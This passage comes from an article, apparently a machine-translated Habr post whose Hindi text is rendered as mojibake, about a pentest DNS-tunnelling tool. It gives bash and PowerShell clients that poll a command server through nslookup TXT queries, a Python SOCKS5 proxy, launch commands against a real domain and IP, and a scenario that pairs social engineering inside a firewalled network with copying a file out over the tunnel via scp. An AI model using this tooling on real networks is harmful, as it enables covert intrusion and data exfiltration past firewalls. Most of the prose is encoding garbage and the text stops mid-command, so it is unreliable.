рд╕рд░рд▓ рднреА рд╣реИред  рд▓реВрдк рдХрд╛ рдкреНрд░рддреНрдпреЗрдХ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдкрд╣рд▓реЗ рдмрддрд╛рдП рдЧрдП рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП nslookup рдХрдорд╛рдВрдб рдХреЗ рд▓рд┐рдП рдПрдХ рдХреЙрд▓ рд╣реИред </p><br><p>  рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ: <br> <code>$text = &amp;nslookup -q=TXT $act$seed$clientname$Dot$domain $server 2&gt;$null</code> <br>  рдпрджрд┐ рддреНрд░реБрдЯрд┐рдпрд╛рдВ рд╣реЛрддреА рд╣реИрдВ, рддреЛ рд╣рдо рдЙрдиреНрд╣реЗрдВ рдирд╣реАрдВ рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ, рддреНрд░реБрдЯрд┐ рд╡рд┐рд╡рд░рдгрдХ рдорд╛рди $ null рдореЗрдВ рднреЗрдЬрддреЗ рд╣реИрдВред </p><br><p>  nslookup рд╣рдореЗрдВ рдПрдХ рд╕рдорд╛рди рдЙрддреНрддрд░ рджреЗрддрд╛ рд╣реИ: <br><img src="https://habrastorage.org/webt/xz/n9/wk/xzn9wkh45ds0pxmpykpo5xrhldc.png"></p><br><p>  рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рд╣рдореЗрдВ рдЙрджреНрдзрд░рдг рдЪрд┐рд╣реНрдиреЛрдВ рдореЗрдВ рд╕рднреА рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдлреИрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рд╣рдо рдПрдХ рдирд┐рдпрдорд┐рдд рд╕реАрдЬрди рдХреЗ рд╕рд╛рде рдЙрдирдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рддреЗ рд╣реИрдВ: </p><br><p> <code>$text = [regex]::Matches($text, '"(.*)"') | %{$_.groups[1].value} | %{$_ -replace '([ "\t]+)',$('') }</code> </p> <br><p>  рдЕрдм рдЖрдк рдкреНрд░рд╛рдкреНрдд рдЖрджреЗрд╢реЛрдВ рдХреЛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред <br>  рд╣рд░ рдмрд╛рд░ "рдкреАрдбрд╝рд┐рдд" рдХреЗ рдЖрдИрдкреА рдкрддреЗ рдореЗрдВ рдПрдХ рдЯреАрд╕реАрдкреА рдХреНрд▓рд╛рдЗрдВрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдЯреНрд░рд╛рдВрд╕рдлрд░ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИред  рдбреАрдПрдирдПрд╕ рд╕рд░реНрд╡рд░ рд╕реЗ, рдЬрд╛рдирдХрд╛рд░реА рдмреЗрд╕ 64-рдбрд┐рдХреЛрдб рдХреА рдЬрд╛рддреА рд╣реИ, рдФрд░ рдмрд╛рдЗрдЯреНрд╕ рдкреАрдбрд╝рд┐рдд рдХреЛ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред  рдпрджрд┐ "рдкреАрдбрд╝рд┐рдд" рдиреЗ рдХреБрдЫ рдЙрддреНрддрд░ рджрд┐рдпрд╛, рддреЛ рд╣рдо рд╕рд╛рдВрдХреЗрддрд┐рдХ рд╢рдмреНрджреЛрдВ рдореЗрдВ рдмрджрд▓рдирд╛, рднрд╛рдЧреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдЕрдиреБрд╕рд╛рд░ nslookup рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВред  рд╡рд╣ рд╕рдм рд╣реИред <br>  рдЬрдм рдЖрдк Ctrl + C рджрдмрд╛рддреЗ рд╣реИрдВ, рддреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХрд╛ рдЕрдиреБрд░реЛрдз рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИред </p><br><h2 id="proxy">  рдкреНрд░реЙрдХреНрд╕реА: </h2><br><p>  рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рдХреЗ рд▓рд┐рдП рдкреНрд░реЙрдХреНрд╕реА python3 рдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рд╣реИред </p><br><p><img src="https://habrastorage.org/webt/k4/lp/0u/k4lp0uzffo9oo90eqommsetwvn4.png"></p><br><p>  рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЖрдкрдХреЛ DNS рд╕рд░реНрд╡рд░ рдХрд╛ IP рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рд╡рд╣ рдкреЛрд░реНрдЯ рдЬрд╣рд╛рдВ рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдирд╛ рд╣реИ, рд╡рд┐рдХрд▓реНрдк --clients рдкрдВрдЬреАрдХреГрдд рдХреНрд▓рд╛рдЗрдВрдЯ, <code>--target - target ip</code> , <code>--client</code> - <code>--target_port - target port</code> , <code>--client</code> - id рдХреА рдХреНрд▓рд╛рдЗрдВрдЯ рдХреА рдПрдХ рд╕реВрдЪреА рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рд╣рдо рдХрд░реЗрдВрдЧреЗ рдХрд╛рдо (- <code>--send_timeout</code> рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдмрд╛рдж рджреЗрдЦрд╛ рдЧрдпрд╛), - <code>--send_timeout</code> - рдЖрд╡реЗрджрди рд╕реЗ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордп рд╕рдорд╛рдкреНрддред </p><br><p>  рдЬрдм - <code>--clients</code> рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдкреНрд░рд╛рд░реВрдк <code>\x00GETCLIENTS\n</code> рдореЗрдВ рднреЗрдЬрддрд╛ рд╣реИред <br>  рдорд╛рдорд▓реЗ рдореЗрдВ рдЬрдм рд╣рдо рдХрд╛рдо рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ, рдЬрдм рдХрдиреЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рдкрд┐рдЫрд▓реЗ рдХрдиреЗрдХреНрд╢рди рдХреЛ рд░реАрд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП format <code>\x02RESET:client_id\n</code> рдореЗрдВ рдПрдХ рд╕рдВрджреЗрд╢ рднреЗрдЬрддреЗ рд╣реИрдВред  рдЕрдкрдиреЗ рд▓рдХреНрд╖реНрдп рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬрдиреЗ рдХреЗ рдмрд╛рдж: <code>\x01client_id:ip:port:\n</code> <br>  рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЬрдм рд╣рдо рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬрддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рдкреНрд░рд╛рд░реВрдк <code>\x03data</code> рдореЗрдВ рдмрд╛рдЗрдЯ рднреЗрдЬрддреЗ рд╣реИрдВ, рдФрд░ рд╣рдо рдХреЗрд╡рд▓ рдЖрд╡реЗрджрди рдХреЗ рд▓рд┐рдП рдХрдЪреНрдЪреЗ рдмрд╛рдЗрдЯ рднреЗрдЬрддреЗ рд╣реИрдВред <br>  рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкреНрд░реЙрдХреНрд╕реА SOCKS5 рдореЛрдб рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред </p><br><h2 id="kakie-trudnosti-mogut-vozniknut">  рдХреНрдпрд╛ рдореБрд╢реНрдХрд┐рд▓реЗрдВ рдЖ рд╕рдХрддреА рд╣реИрдВ? </h2><br><p>  рдХрд┐рд╕реА рднреА рддрдВрддреНрд░ рдХреА рддрд░рд╣, рдЙрдкрдпреЛрдЧрд┐рддрд╛ рд╡рд┐рдлрд▓ рд╣реЛ рд╕рдХрддреА рд╣реИред  рдЖрдЗрдП рдпрд╣ рдордд рднреВрд▓реЛ рдХрд┐ DNS рд╕реБрд░рдВрдЧ рдПрдХ рдкрддрд▓реА рдЪреАрдЬ рд╣реИ, рдФрд░ рдХрдИ рдХрд╛рд░рдХ рдЗрд╕рдХреЗ рд╕рдВрдЪрд╛рд▓рди рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдиреЗрдЯрд╡рд░реНрдХ рд╡рд╛рд╕реНрддреБрдХрд▓рд╛ рд╕реЗ рдЖрдкрдХреЗ рдЙрддреНрдкрд╛рджрди рд╕рд░реНрд╡рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рддрдХред </p><br><p>  рдкрд░реАрдХреНрд╖рдг рдХреЗ рджреМрд░рд╛рди, рд╣рдордиреЗ рдХрднреА-рдХрднреА рдЫреЛрдЯреЗ рдЧреНрд▓рд┐рдЯреНрд╕ рдкрд░ рдзреНрдпрд╛рди рджрд┐рдпрд╛ред  рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЙрдЪреНрдЪ рдкреНрд░рд┐рдВрдЯ рдЧрддрд┐ рдкрд░, ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд╛рдо рдХрд░рддреЗ рд╣реБрдП, рдпрд╣ <code>--send_timeout</code> рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд╛рдпрдХ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреНрдпрдерд╛ рдЧреНрд░рд╛рд╣рдХ рдлреНрд░реАрдЬ рд╣реЛрдирд╛ рд╢реБрд░реВ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред  рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХрднреА-рдХрднреА рдХрдиреЗрдХреНрд╢рди рдкрд╣рд▓реА рдмрд╛рд░ рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдЗрд▓рд╛рдЬ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдирдП рдХрдиреЗрдХреНрд╢рди рдХреЗ рджреМрд░рд╛рди рдХрдиреЗрдХреНрд╢рди рд░реАрд╕реЗрдЯ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред  рд╕рдореАрдкрд╕реНрдереЛрдВ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддреЗ рд╕рдордп рдбреЛрдореЗрди рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдХреЗ рд╕рд╛рде рд╕рдорд╕реНрдпрд╛рдПрдВ рднреА рдереАрдВ, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЖрдк рдкреНрд░реЙрдХреНрд╕рд┐рдЪрд┐рди рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдкреИрд░рд╛рдореАрдЯрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рднреА рдареАрдХ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╣реИред  рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдлрд┐рд▓рд╣рд╛рд▓ рдЙрдкрдпреЛрдЧрд┐рддрд╛ DNS рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдХреИрд╢рд┐рдВрдЧ рд╕реЗ рдЕрдирд╛рд╡рд╢реНрдпрдХ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░рддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХрдиреЗрдХреНрд╢рди рдХрднреА-рдХрднреА рд╡рд┐рдлрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдКрдкрд░ рд╡рд░реНрдгрд┐рдд рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд┐рд░ рд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред </p><br><h2 id="zapusk">  рд▓рд╛рдВрдЪ </h2><br><p>  рдбреЛрдореЗрди рдкрд░ NS рд░рд┐рдХреЙрд░реНрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ: </p><br><p><img src="https://habrastorage.org/webt/_q/p4/er/_qp4erwn54g5nqqxmlnnquv1itk.png"></p><br><p>  рд╣рдо рддрдм рддрдХ рдЗрдВрддрдЬрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рддрдХ рдХреИрд╢ рдЕрдкрдбреЗрдЯ рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛ (рдЖрдорддреМрд░ рдкрд░ 5 рдШрдВрдЯреЗ рддрдХ)ред </p><br><p>  рд╣рдо рд╕рд░реНрд╡рд░ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ: <br> <code>python3 ./server.py --domain oversec.ru</code> </p> <br><p>  рдХреНрд▓рд╛рдЗрдВрдЯ (рдмреИрд╢) рд▓реЙрдиреНрдЪ рдХрд░реЗрдВ: <br> <code>bash ./bash_client.sh -d oversec.ru -n TEST1</code> </p> <br><p>  рд╣рдо рдХреНрд▓рд╛рдЗрдВрдЯ (рд╡рд┐рди) рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ: <br> <code>PS:&gt; ./ps_client.ps1 -domain oversec.ru -clientname TEST2</code> </p> <br><p>  рдЖрдЗрдП рджреЗрдЦреЗрдВ рдЬреБрдбрд╝реЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреА рд╕реВрдЪреА: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --clients</code> </p> <br><p>  рдкреНрд░реЙрдХреНрд╕реА рд▓реЙрдиреНрдЪ рдХрд░реЗрдВ: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --socks5 --localport 9090 --client 1</code> </p> <br><p>  рдкрд░реАрдХреНрд╖рдг: </p><br><p>  рд╕рд░реНрд╡рд░ рдХреЗ рдмрд╛рдж рдФрд░ рдХрдо рд╕реЗ рдХрдо рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╣рдо рдкреНрд░реЙрдХреНрд╕реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ рд╣рдорд╛рд░реА рд░рд┐рдореЛрдЯ рдорд╢реАрди рдереАред <br>  рдЖрдЗрдП рдирд┐рдореНрди рд╕реНрдерд┐рддрд┐ рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ: рдкрдВрдЪрдХ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдВрдЧрдарди рдХреЗ рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ рд╕реЛрд╢рд▓ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдХреЗ рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рд╡рд╣ DNS рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рдЪрд▓рд╛рдиреЗ рдФрд░ рдПрд╕рдПрд╕рдПрдЪ рд╕рд░реНрд╡рд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдерд╛ред </p><br><p>  рдЕрдкрдиреА рдорд╢реАрди рдкрд░ рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕реА рддрд░рд╣ рдХреА рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ред <br> <code>scp -P9090 -C root@localhost:/root/dnserver.py test.kek</code> </p> <br><p>  рдЖрдЗрдП рджреЗрдЦреЗрдВ рдХреНрдпрд╛ рд╣реБрдЖ: </p><br><p><img src="https://habrastorage.org/webt/xd/un/ag/xdunagwddytfwinhgkcxxossnqi.png"></p><br><p>  рдКрдкрд░ рдмрд╛рдИрдВ рдУрд░, рдЖрдк DNS рдХреНрд╡реЗрд░реАрдЬрд╝ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕рд░реНрд╡рд░ рдкрд░ рдЖрддреА рд╣реИрдВ, рдКрдкрд░ рджрд╛рдИрдВ рдУрд░ - рдкреНрд░реЙрдХреНрд╕реА рдЯреНрд░реИрдлрд╝рд┐рдХ, рдиреАрдЪреЗ рдмрд╛рдИрдВ рдУрд░ - рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ, рдФрд░ рдиреАрдЪреЗ рджрд╛рдИрдВ рдУрд░ рд╕реЗ - рд╣рдорд╛рд░рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиред  рдбреАрдПрдирдПрд╕ рд╕реБрд░рдВрдЧ рдХреЗ рд▓рд┐рдП рдЧрддрд┐ рдмрд╣реБрдд рдЕрдЪреНрдЫреА рдирд┐рдХрд▓реА: 4.9Kb / s рдХрдореНрдкреНрд░реЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдПред </p><br><p>  рдЬрдм рд╕рдВрдкреАрдбрд╝рди рдХреЗ рдмрд┐рдирд╛ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛, рддреЛ рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдиреЗ 1.8 kb / s рдХреА рдЧрддрд┐ рджрд┐рдЦрд╛рдИ: </p><br><p><img src="https://habrastorage.org/webt/vs/lv/6o/vslv6oycbyicpppojlsbh2hs_hi.png"></p><br><p>  рдЖрдЗрдП DNS рд╕рд░реНрд╡рд░ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдзреНрдпрд╛рди рд╕реЗ рджреЗрдЦреЗрдВ, рдЗрд╕рдХреЗ рд▓рд┐рдП рд╣рдо tcpdump рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред <br> <code>tcpdump -i eth0 udp port 53</code> </p> <br><p><img src="https://habrastorage.org/webt/oo/wx/pf/oowxpflehofc-dmyizrf6pwre08.png"></p><br><p>  рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рд╕рдм рдХреБрдЫ рд╡рд░реНрдгрд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдЕрдиреБрд░реВрдк рд╣реИ: рдХреНрд▓рд╛рдЗрдВрдЯ рд▓рдЧрд╛рддрд╛рд░ рд╕рд░реНрд╡рд░ рдХреЛ <code>1c6Zx9Vi39.oversec.ru</code> рдЬреИрд╕реЗ рдкреНрд░рд╢реНрдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдирдпрд╛ рдбреЗрдЯрд╛ рд╣реЛред  рдпрджрд┐ рдбреЗрдЯрд╛ рд╣реИ, рддреЛ рд╕рд░реНрд╡рд░ TXT рд░рд┐рдХреЙрд░реНрдб рдХреЗ рдПрдХ рд╕реЗрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ, рдЕрдиреНрдпрдерд╛% client_num% ND ( <code>39ND</code> )ред  рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд░реНрд╡рд░ рдкреНрд░рд╢реНрдиреЛрдВ рдХреЗ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬрддрд╛ рд╣реИ <code>28sTx39003.MyNTYtZ2NtQG9wZW5zc2guY29tAAAAbGNoYWNoYTIwLXBvbHkxMzA1QG9wZW5zc.2guY29tLGFlczEyOC1jdHIsYWVzMTkyLWN0cixhZXMyNTYtY3RyLGFlczEyOC1n.Y21Ab3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAANV1bWFjLTY.0LWV0bUBvcGVuc3NoLmNvbSx1bWFjLTEyOC1.oversec.ru.</code> </p><br><p>  рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡реАрдбрд┐рдпреЛ рдореЗрдВ, рдЖрдк рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдореАрдЯрд░рдореАрдЯрд░ рдФрд░ SOCKS5 рдореЛрдб рдХреЗ рд╕рд╛рде рдорд┐рд▓рдХрд░ рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддреА рд╣реИред </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/N6Nm9mWFI6w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/xSM-Dl1uo1k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="itog">  рдкрд░рд┐рдгрд╛рдо: </h2><br><p>  рдЖрдЗрдП рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рдереЛрдбрд╝рд╛ рдмрддрд╛рдПрдВред  рдЗрд╕ рд╡рд┐рдХрд╛рд╕ рдореЗрдВ рдХреНрдпрд╛ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ рд╣реИрдВ рдФрд░ рд╣рдо рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рдХреНрдпреЛрдВ рджреЗрддреЗ рд╣реИрдВ? </p><br><ol><li>  рдмреИрд╢ рдФрд░ рдкреЙрд╡рд░реНрд╕рд╢реЗрд▓ рдкрд░ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдП рдЧрдП рдЧреНрд░рд╛рд╣рдХ: рдХреЛрдИ EXE-shnikov рдФрд░ ELF-s рдЬрд┐рд╕реЗ рдЪрд▓рд╛рдирд╛ рдореБрд╢реНрдХрд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред </li><li>  рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд┐рд░рддрд╛: рдкрд░реАрдХреНрд╖рдгреЛрдВ рдореЗрдВ, рд╣рдорд╛рд░реА рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдиреЗ рдЕрдзрд┐рдХ рд╕реНрдерд┐рд░ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд┐рдпрд╛, рдФрд░ рдпрджрд┐ рдХреЛрдИ рдмрдЧ рдереЗ, рддреЛ рдЖрдк рдмрд╕ рдлрд┐рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрдмрдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреНрд░реИрд╢ рдирд╣реАрдВ рд╣реБрдЖ рдерд╛, рдЬреИрд╕рд╛ рдХрд┐ dnscat2 рдХреЗ рд╕рд╛рде рдорд╛рдорд▓рд╛ рдерд╛, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдПред </li><li>  DNS рд╕реБрд░рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдЪреНрдЪ рдЧрддрд┐: рдмреЗрд╢рдХ, рдЧрддрд┐ рдЖрдпреЛрдбреАрди рддрдХ рдирд╣реАрдВ рдкрд╣реБрдВрдЪрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ рдирд┐рдореНрди-рд╕реНрддрд░ рдХрд╛ рдПрдХ рдЬрдЯрд┐рд▓ рд╕рдорд╛рдзрд╛рди рд╣реИред </li><li>  рдХрд┐рд╕реА рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЕрдзрд┐рдХрд╛рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ: рдмреИрд╢ рдХреНрд▓рд╛рдЗрдВрдЯ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдмрд┐рдирд╛ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдкреЙрд╡рд░реНрд╕рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрднреА-рдХрднреА рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖рд┐рджреНрдз рд╣реЛрддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рдХрд╛рдлреА рд╕рд░рд▓ рд╣реИред </li><li>  рдПрдХ рдореЛрдЬреЗ 5 рдкреНрд░реЙрдХреНрд╕реА рдореЛрдб рд╣реИ, рдЬреЛ рдЖрдкрдХреЛ рдЗрддрдиреЗ <code>curl -v --socks5 127.0.0.1:9011 https://ident.me</code> рдпрд╛ рдкреВрд░реЗ рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ <code>curl -v --socks5 